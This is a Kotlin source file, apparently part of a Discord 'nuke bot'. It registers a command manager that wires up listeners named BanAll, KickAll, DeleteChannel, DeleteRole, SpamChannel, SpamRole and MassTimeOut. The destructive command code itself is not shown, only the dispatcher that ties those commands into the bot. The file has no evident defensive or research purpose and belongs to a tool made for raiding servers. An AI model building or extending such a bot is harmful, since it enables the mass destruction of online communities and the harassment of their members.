package thenano.nukebot.bot.command

import net.dv8tion.jda.api.JDA
import thenano.nukebot.bot.command.commands.*

internal object CommandManager {

    var stop = false
    var listeners:ArrayList<CommandListener> = arrayListOf()

    fun onInitListeners(jda: JDA) {
        jda.addEventListener(BanAll())
        jda.addEventListener(DeleteChannel())
        jda.addEventListener(SpamChannel())
        jda.addEventListener(KickAll())
        jda.addEventListener(SpamRole())
        jda.addEventListener(DeleteRole())
        jda.addEventListener(MassTimeOut())
        jda.addEventListener(Help())
        jda.addEventListener(Stop())
    }
}